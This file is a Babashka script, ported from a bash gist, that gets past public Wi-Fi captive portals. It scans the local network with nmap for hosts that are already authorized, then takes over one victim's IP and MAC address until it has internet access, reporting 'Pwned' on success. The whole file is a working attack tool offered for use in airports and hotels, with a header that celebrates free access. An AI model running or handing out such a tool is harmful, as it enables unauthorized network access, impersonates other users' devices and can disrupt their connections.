#!/usr/bin/env bb
; https://gist.github.com/matthewdowney/dab4d12d001152dec473e3c4db5c36dc

; =========================================================================== ;
;           FILE:  hack-captive-portal.bb                                     ;
;          USAGE:  sudo bb hack-captive-portal.bb                             ;
;                                                                             ;
;    DESCRIPTION:  This script helps to pass through the captive portals in   ;
;                  public Wi-Fi networks. It hijacks IP and MAC from somebody ;
;                  who is already connected and authorized on captive portal. ;
;                  Tested in Ubuntu 16.04 with different captive portals in   ;
;                  airports and hotels all over the world.                    ;
;                                                                             ;
;   REQUIREMENTS:  coreutils, sipcalc, nmap                                   ;
;          NOTES:  Let the information always be free!                        ;
;         AUTHOR:  Stanislav "systematicat" Kotivetc, <@systematicat>         ;
;        COMPANY:  Hire me! I am a cool dude!                                 ;
;        VERSION:  1.0                                                        ;
;        CREATED:  16.12.2016 - 23:59                                         ;
;       REVISION:  ---                                                        ;
;      COPYRIGHT:  2016 Stanislav "systematicat" Kotivetc                     ;
;        LICENSE:  WTFPL v2                                                   ;
; =========================================================================== ;
;            FIX:  MiAl (HackWare.ru)                                         ;
; =========================================================================== ;
;        UPDATED: github.com/matthewdowney                                    ;
;           DATE: 19.12.2022                                                  ;
;          NOTES: Ported from bash to Babashka, other minor tweaks.           ;
; =========================================================================== ;
(ns hack-capitve-portal
  (:require [babashka.process :refer [shell] :as proc]
            [clojure.string]
            [clojure.string :as str]))

;;; Helper functions for bash / assertions

(defn require-sudo []
  (not
    (when-not (-> (proc/sh "bash -c 'echo $EUID'") :out str/trim (= "0"))
      (println "[fatal] Root access required (for nmap).")
      :false)))

(defn require-binary [check-with-command]
  (not
    (let [{:keys [exit out err]}
          (try
            (proc/sh check-with-command)
            (catch Exception _ {:exit 1}))]
      (when (pos? exit)
        (println
          (format "[fatal] '%s' failed with exit code %"
                  check-with-command exit))
        (println (first (str/split check-with-command #"\s+"))
                 "is required for this program")
        :fail))))

(defn warn-nmap-version []
  (when (require-binary "nmap --version")
    (let [{:keys [out]} (proc/sh "nmap --version")
          [_ major minor] (re-matches #"(?s)Nmap version (\d+)\.(\d+).*" out)
          pl parse-long]
      (when (and major minor (<= (pl major) 7) (<= (pl minor) 80))
        (println "[warn] nmap <= 7.80 (which comes via apt-get) failed")
        (println "[warn] for me due to https://github.com/nmap/nmap/issues/1764")
        (println "[warn] a newer version is suggested")))))

;; Check requirements before loading the rest of the script, if running at the
;; command line
(when (= *file* (System/getProperty "babashka.file"))
  (when-not (and (require-sudo)
                 (require-binary "ip -V")
                 (require-binary "iw --version")

                 (require-binary "nmap --version")
                 (require-binary "sipcalc --version"))
    (System/exit 1))
  (warn-nmap-version))

(defn log [& args] (apply println "[*]" args))
(defn logf [& args] (println "[*]" (apply format args)))

(defn sh [& args]
  (let [cmd (pr-str (str/join \space args))
        _ (println "[bash]" (pr-str (str/join \space args)))
        ret (apply proc/sh args)]

    (doseq [l (str/split-lines (:out ret))] (println \tab l))

    (when-not (zero? (:exit ret))
      (let [err (str "Non-zero exit code for '" cmd "'")]
        (println "[error]" (:exit ret))
        (doseq [l (str/split-lines (:err ret))] (println \tab l))
        (throw (ex-info err ret))))

    (:out ret)))

;;; Network scanning helpers

(defn scan! [network]
  (logf "Scanning for active hosts in %s..." network)
  (as-> (sh "nmap -n -sn -PR -PS -PA -PU -T5" network) $
    (str/split $ #"Nmap scan report for")
    (keep
      (fn [report]
        (let [[ip status mac] (str/split-lines report)]
          (when (and status
                     (re-matches #"\s*Host is up.*" status)
                     (re-matches #"\s*MAC Address.*" mac))
            {:ip     (second (re-matches #"\s*(.*)" ip))
             :status status
             :mac    (str/lower-case (nth (str/split mac #"\s+") 2))})))
      $)))

(defn ?split-network
  "Split the network into a series of smaller chunks of `size`, if necessary,
  or just return [network].

  Input / output networks are shaped e.g. 192.168.0.0/24"
  [network netmask size]
  (if (< (parse-long netmask) size)
    (->> (sh "sipcalc -s" size network)
         str/split-lines
         (filter #(str/starts-with? % "Network"))
         (keep #(nth (str/split % #"\s+") 2 nil))
         (map #(str % "/" size))))
  [network])

;;; Helpers to read network configuration

(defn word-at [str n] (nth (str/split str #"\s+") n nil))
(defn parse [str re]
  (let [?match #(second (re-matches re %))]
    (->> (str/split-lines str)
         (keep ?match)
         first)))

;;; Main script

;; Global state: networking config
(log "Getting Wi-Fi configuration details...")              ; no sudo required for these
(def interface (-> (sh "ip -o -4 route show to default") (word-at 4)))
(def localip (-> (sh "ip -o -4 route get 1") (word-at 6)))
(def ssid (-> (sh "iw dev" interface "link") (parse #".*SSID: (.*)")))
(def gateway (-> (sh "ip -o -4 route show to default") (word-at 2)))
(def broadcast (-> (sh "ip -o -4 addr show dev" interface) (word-at 5)))
(def ipmask (-> (sh "ip -o -4 addr show dev" interface) (word-at 3)))
(def netmask (second (str/split ipmask #"/")))
(def netaddress (-> (sh "sipcalc" ipmask) (parse #"Network address\s+-\s(.*)")))
(def macaddress (-> (sh "ip -0 addr show dev" interface) (parse #"\s*link\/ether (\S+).*") str/lower-case))
(def network (str netaddress "/" netmask))
(def networks (?split-network network netmask 24))

(log "Getting router details...")                           ; sudo required here
(def routermac (-> (sh "nmap -n -sn -PR -PS -PA -PU -T5" gateway) (parse #".*MAC Address: (\S+).*") str/lower-case))

(defn assume! [{:keys [ipmask mac] :as target}]
  (logf "Assuming new identity %s..." target)

  (sh "ip link set" interface "down")
  (sh "ip link set dev" interface "address" mac)
  (sh "ip link set" interface "up")
  (sh "ip addr flush dev" interface)
  (sh "ip addr add" ipmask "broadcast" broadcast "dev" interface)
  (sh "ip route add default via" gateway))

(defn dns-pingable? []
  (try
    (sh "ping -c1 -w1 8.8.8.8") (log "Connected.") true
    (catch Exception _ (log "No internet access.") false)))

(defn hijack! [{:keys [ip status mac] :as h}]
  (logf "Attempting hijack of %s..." h)
  (assume! {:ipmask (str ip "/" netmask) :mac mac})

  (print "Waiting for changes to take effect") (flush)
  (let [now #(System/currentTimeMillis)
        down? #(= (str/trim (:out (proc/sh "iw dev" interface "link"))) "Not connected.")
        timeout (+ (now) 5000)]
    (while (and (down?) (< (now) timeout))
      (print ".")
      (flush)
      (Thread/sleep 1000)))
  (println "")

  (dns-pingable?))

(defn main* []
  (logf "Exploring Wi-Fi network for SSID '%s'.." ssid)
  (when (> (count networks) 1)
    (logf "Splitting network %s into %s subnets for scanning" network (count networks)))

  (if-let [hosts (->> networks
                      (mapcat scan!)
                      ; do not try to hijack the router, or our own ip
                      (remove (comp #{routermac} :mac))
                      (remove (comp #{localip} :ip))
                      seq)]
    (do
      (logf "Found %s active hosts" (count hosts))
      (loop [hosts hosts]
        (if-let [h (first hosts)]
          (if (hijack! h)
            (log "Pwned: hijacked" h)
            (do (log "Skipped" h) (recur (rest hosts))))
          (log "Unable to hijack any of the active hosts"))))
    (log "No hosts. Try again later or on another hotspot.")))

;; Main entry point when running from the command line
(when (= *file* (System/getProperty "babashka.file"))
  (try
    (main*)
    (logf "(Original identity was %s)" (pr-str {:ipmask ipmask :mac macaddress}))
    (catch Exception _
      (println "\n")
      (log "Failed... attempting clean-up")

      ; Re-assume the original identity
      (try
        (assume! {:ipmask ipmask :mac macaddress})
        (log "Original network identity restored.")
        (dns-pingable?)
        (catch Exception e
          (println "\n")
          (log "Failed (!) to restore initial network identity.")
          (log "Restart your computer, I guess? Sorry.")
          (throw e))))))
